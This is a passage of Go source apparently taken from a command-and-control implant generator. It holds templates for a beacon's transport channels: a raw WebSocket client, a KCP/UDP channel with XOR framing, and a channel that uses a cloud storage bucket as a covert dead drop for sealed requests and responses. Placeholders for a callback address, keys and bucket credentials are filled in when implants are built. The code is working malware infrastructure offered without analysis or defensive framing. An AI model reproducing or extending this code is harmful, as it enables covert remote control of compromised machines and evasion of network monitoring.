		"Upgrade: websocket\r\nConnection: Upgrade\r\n" +
		"Sec-WebSocket-Key: " + key + "\r\nSec-WebSocket-Version: 13\r\n" +
		"User-Agent: " + ua + "\r\n\r\n"
	if _, err := c.Write([]byte(req)); err != nil {
		_ = c.Close()
		return err
	}
	bio := bufio.NewReader(c)
	resp, err := http.ReadResponse(bio, nil)
	if err != nil {
		_ = c.Close()
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusSwitchingProtocols {
		_ = c.Close()
		return fmt.Errorf("ws handshake http %d", resp.StatusCode)
	}
	sum := sha1.Sum([]byte(key + wsGUID))
	if resp.Header.Get("Sec-WebSocket-Accept") != base64.StdEncoding.EncodeToString(sum[:]) {
		_ = c.Close()
		return errors.New("ws accept mismatch")
	}
	wsMu.Lock()
	wsConn = c
	wsBuf.Reset()
	// 握手响应可能已带部分帧数据
	if bio.Buffered() > 0 {
		_, _ = io.CopyN(&wsBuf, bio, int64(bio.Buffered()))
	}
	wsMu.Unlock()
	return nil
}

func wsSendText(payload []byte) error {
	mask := make([]byte, 4)
	_, _ = crand.Read(mask)
	hdr := []byte{0x81}
	n := len(payload)
	switch {
	case n < 126:
		hdr = append(hdr, byte(0x80|n))
	case n < 65536:
		hdr = append(hdr, 0x80|126, byte(n>>8), byte(n))
	default:
		hdr = append(hdr, 0x80|127)
		var ext [8]byte
		binary.BigEndian.PutUint64(ext[:], uint64(n))
		hdr = append(hdr, ext[:]...)
	}
	hdr = append(hdr, mask...)
	masked := make([]byte, n)
	for i := 0; i < n; i++ {
		masked[i] = payload[i] ^ mask[i%4]
	}
	_, err := wsConn.Write(append(hdr, masked...))
	return err
}

func wsReadN(n int) ([]byte, error) {
	for wsBuf.Len() < n {
		buf := make([]byte, 65536)
		red, err := wsConn.Read(buf)
		if err != nil {
			return nil, err
		}
		wsBuf.Write(buf[:red])
	}
	return wsBuf.Next(n), nil
}

func wsRecvData() ([]byte, error) {
	var payload []byte
	for {
		h, err := wsReadN(2)
		if err != nil {
			return nil, err
		}
		opcode := h[0] & 0x0F
		fin := h[0]&0x80 != 0
		ln := int(h[1] & 0x7F) // 服务端帧不掩码
		switch ln {
		case 126:
			e, err := wsReadN(2)
			if err != nil {
				return nil, err
			}
			ln = int(binary.BigEndian.Uint16(e))
		case 127:
			e, err := wsReadN(8)
			if err != nil {
				return nil, err
			}
			ln = int(binary.BigEndian.Uint64(e))
		}
		data := []byte(nil)
		if ln > 0 {
			if data, err = wsReadN(ln); err != nil {
				return nil, err
			}
		}
		switch opcode {
		case 0x9: // ping → pong
			pong := []byte{0x8A, byte(0x80 | len(data))}
			mask := make([]byte, 4)
			_, _ = crand.Read(mask)
			pong = append(pong, mask...)
			for i := range data {
				pong = append(pong, data[i]^mask[i%4])
			}
			if _, err := wsConn.Write(pong); err != nil {
				return nil, err
			}
			continue
		case 0xA: // pong
			continue
		case 0x8: // close
			return nil, errors.New("ws closed by peer")
		}
		payload = append(payload, data...)
		if fin {
			return payload, nil
		}
	}
}

func call(t string, d any, sid string) (map[string]any, error) {
	var last error
	for attempt := 0; attempt < 2; attempt++ {
		env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
		if sid != "" {
			env["sid"] = sid
		}
		if d != nil {
			env["d"] = d
		}
		sealed, serr := sealRaw(env)
		if serr != nil {
			return nil, serr
		}
		msg := []byte(base64.StdEncoding.EncodeToString(sealed))
		wsMu.Lock()
		if wsConn == nil {
			if err := wsConnect(); err != nil {
				wsMu.Unlock()
				return nil, err
			}
		}
		if err := wsSendText(msg); err != nil {
			_ = wsConn.Close()
			wsConn = nil
			wsMu.Unlock()
			last = err
			continue
		}
		resp, rerr := wsRecvData()
		if rerr != nil {
			_ = wsConn.Close()
			wsConn = nil
			wsMu.Unlock()
			last = rerr
			if attempt == 1 {
				return nil, rerr
			}
			continue
		}
		wsMu.Unlock()
		wire, derr := base64.StdEncoding.DecodeString(string(resp))
		if derr != nil {
			return nil, derr
		}
		return openRaw(wire)
	}
	return nil, last
}
`

// goChanKCP kcp-go 客户端承载同款 4B 长度帧(双端 stream 模式);可选 psk 帧级 XOR。
const goChanKCP = `var kcpPSK = []byte(__KCP_PSK__)

func dialAddrRaw() string {
	hp := cbAddr
	for _, p := range []string{"https://", "http://"} {
		hp = strings.TrimPrefix(hp, p)
	}
	if i := strings.Index(hp, "/"); i >= 0 {
		hp = hp[:i]
	}
	return hp
}

func xorFrame(buf []byte, off int) {
	if len(kcpPSK) == 0 {
		return
	}
	for i := range buf {
		buf[i] ^= kcpPSK[(off+i)%len(kcpPSK)]
	}
}

func dialChannel() (net.Conn, error) {
	c, err := kcp.Dial(dialAddrRaw())
	if err != nil {
		return nil, err
	}
	if s, ok := c.(*kcp.UDPSession); ok {
		s.SetStreamMode(true)
		s.SetNoDelay(1, 10, 2, 1)
		s.SetWindowSize(256, 256)
	}
	return c, nil
}

func writeFrame(c net.Conn, frame []byte) error {
	buf := make([]byte, 4+len(frame))
	binary.BigEndian.PutUint32(buf, uint32(len(frame)))
	copy(buf[4:], frame)
	xorFrame(buf, 0)
	_, err := c.Write(buf)
	return err
}

func readFrame(c net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(c, hdr); err != nil {
		return nil, err
	}
	xorFrame(hdr, 0)
	n := binary.BigEndian.Uint32(hdr)
	if n == 0 || n > 8<<20 {
		return nil, errors.New("bad frame len")
	}
	buf := make([]byte, n)
	if _, err := io.ReadFull(c, buf); err != nil {
		return nil, err
	}
	xorFrame(buf, 4)
	return buf, nil
}

func call(t string, d any, sid string) (map[string]any, error) {
	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
	if sid != "" {
		env["sid"] = sid
	}
	if d != nil {
		env["d"] = d
	}
	c, err := dialChannel()
	if err != nil {
		return nil, err
	}
	defer c.Close()
	_ = c.SetDeadline(time.Now().Add(60 * time.Second))
	sealed, err := sealRaw(env)
	if err != nil {
		return nil, err
	}
	if err := writeFrame(c, sealed); err != nil {
		return nil, err
	}
	resp, err := readFrame(c)
	if err != nil {
		return nil, err
	}
	return openRaw(resp)
}
`

// goChanOSS 手写 V1 HMAC-SHA1 签名(net/http);对象即帧。
const goChanOSS = `const (
	ossEP     = __OSS_EP__
	ossBucket = __OSS_BUCKET__
	ossAK     = __OSS_AK__
	ossSK     = __OSS_SK__
	ossPrefix = __OSS_PREFIX__
)

var beaconUID = ""

func ossHost() string {
	ep := ossEP
	for _, p := range []string{"https://", "http://"} {
		ep = strings.TrimPrefix(ep, p)
	}
	return ossBucket + "." + ep
}

func ossSign(method, date, resource string, body []byte) string {
	ss := method + "\n" + "\n" + "application/octet-stream" + "\n" + date + "\n" + resource
	mac := hmac.New(sha1.New, []byte(ossSK))
	_, _ = mac.Write([]byte(ss))
	return "OSS " + ossAK + ":" + base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

func ossOp(method, key string, body []byte) ([]byte, bool, error) {
	date := time.Now().UTC().Format(http.TimeFormat)
	req, err := http.NewRequest(method, "https://"+ossHost()+"/"+key, func() io.Reader {
		if body == nil {
			return nil
		}
		return bytes.NewReader(body)
	}())
	if err != nil {
		return nil, false, err
	}
	req.Header.Set("Date", date)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Authorization", ossSign(method, date, "/"+ossBucket+"/"+key, body))
	resp, err := client.Do(req)
	if err != nil {
		return nil, false, err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
	if err != nil {
		return nil, false, err
	}
	return data, resp.StatusCode == http.StatusNotFound, nil
}

func call(t string, d any, sid string) (map[string]any, error) {
	env := map[string]any{"t": t, "ts": time.Now().Unix(), "nc": newNC()}
	if sid != "" {
		env["sid"] = sid
	}
	if d != nil {
		env["d"] = d
	}
	sealed, err := sealRaw(env)
	if err != nil {
		return nil, err
	}
	rid, _ := env["nc"].(string)
	base := ossPrefix + "/" + beaconUID
	if _, _, err := ossOp(http.MethodPut, base+"/req/"+rid, sealed); err != nil {
		return nil, err
	}
	for i := 0; i < 60; i++ {
		data, notFound, err := ossOp(http.MethodGet, base+"/resp/"+rid, nil)
		if err == nil && !notFound {
			_, _, _ = ossOp(http.MethodDelete, base+"/resp/"+rid, nil)
			return openRaw(data)
		}
		time.Sleep(time.Second)
	}
	return nil, errors.New("oss response timeout")
}
`
